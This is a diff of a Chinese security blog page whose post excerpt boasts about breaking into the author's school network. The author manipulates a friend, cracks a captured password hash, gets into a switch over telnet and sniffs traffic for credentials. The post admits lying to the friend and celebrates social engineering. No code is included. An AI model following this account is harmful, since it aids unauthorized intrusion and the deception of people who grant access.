alt="clip_image090" src="http://img.cker.in/df99b5f14772_C386/clip_image090_thumb.jpg" width="242" height="300"></a><a href="http://img.cker.in/df99b5f14772_C386/clip_image092.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image092" border="0" alt="clip_image092" src="http://img.cker.in/df99b5f14772_C386/clip_image092_thumb.jpg" width="251" height="340"></a></p>  <p>他这个煞笔，居然服务器密码都忘记了，当然我好人，当时抓了hash，破解了，帮他打上了，然后他就</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image093.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image093" border="0" alt="clip_image093" src="http://img.cker.in/df99b5f14772_C386/clip_image093_thumb.jpg" width="503" height="340"></a></p>  <p>NND，就看了下是不是真的进入了学校服务器，我蛋疼，就一直停留在这里，跟我扯，因为当时我远程看他的，所以就蛋疼了一晚上，还问我怎么学校同意我登录上去的，又让我说了一个善意的谎言。</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image095.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image095" border="0" alt="clip_image095" src="http://img.cker.in/df99b5f14772_C386/clip_image095_thumb.jpg" width="307" height="309"></a><a href="http://img.cker.in/df99b5f14772_C386/clip_image096.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image096" border="0" alt="clip_image096" src="http://img.cker.in/df99b5f14772_C386/clip_image096_thumb.jpg" width="270" height="93"></a></p>  <p>当我看见telnet这几个字的时候，我激动了。跟小胖子扯了一会，然后我就一直哄他用交换机，最后还是搞定了。</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image098.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image098" border="0" alt="clip_image098" src="http://img.cker.in/df99b5f14772_C386/clip_image098_thumb.jpg" width="311" height="703"></a><a href="http://img.cker.in/df99b5f14772_C386/clip_image100.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image100" border="0" alt="clip_image100" src="http://img.cker.in/df99b5f14772_C386/clip_image100_thumb.jpg" width="165" height="176"></a></p>  <p>当时没有截 特权模式密码的图，所以就不贴了， 嗅探时候显示有些问题，所以蛋疼了，本来想装个键盘记录的了，但是找不到好使了，所以直接嗅探了，这个贱人，让我陪了她一晚上，浪费了我的青春。多谢我亲爱的朋友配合，让我认识了贵校的领导名字 - -~~~！</p>  <p>0x08</p>  <p>总结。</p>  <p>爱渗透你会更爱<a href="http://ha.cker.in/tag/社工" target="_blank">社工</a>，爱你妹你会更爱基友！</p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/779.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/779.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/779.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/779.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/782.seo/">
-        ← 对某非主流外贸网站的渗透测试
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/774.seo/">
-        利用XSS跨站漏洞入侵百度投诉中心用xss平台沦陷百度投诉中心后台 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/渗透/">渗透</a><a href="/tag/嗅探/">嗅探</a><a href="/tag/C段/">C段</a><a href="/tag/社工/">社工</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/782.seo/" title="对某非主流外贸网站的渗透测试">
+  <strong>Prev:</strong><br/>
+  <span>
+  对某非主流外贸网站的渗透测试</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/774.seo/"  title="利用XSS跨站漏洞入侵百度投诉中心用xss平台沦陷百度投诉中心后台">
+ <strong>Next:</strong><br/> 
+ <span>利用XSS跨站漏洞入侵百度投诉中心用xss平台沦陷百度投诉中心后台
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-友谊的 招呼 -对母校的亲密检测" data-title="友谊的 招呼 -对母校的亲密检测" data-url="http://ha.cker.in/779.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
